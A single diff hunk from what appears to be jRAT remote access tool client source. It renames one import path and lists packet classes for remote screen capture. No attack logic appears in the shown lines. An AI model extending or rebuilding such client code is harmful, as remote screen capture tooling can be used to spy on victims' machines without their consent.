@@ -1,6 +1,6 @@
 package jrat.client;
 
-import io.jrat.common.utils.ImageUtils;
+import jrat.common.utils.ImageUtils;
 import jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import jrat.client.packets.outgoing.Packet26RemoteScreen;
 import jrat.client.packets.outgoing.Packet68RemoteScreenComplete;
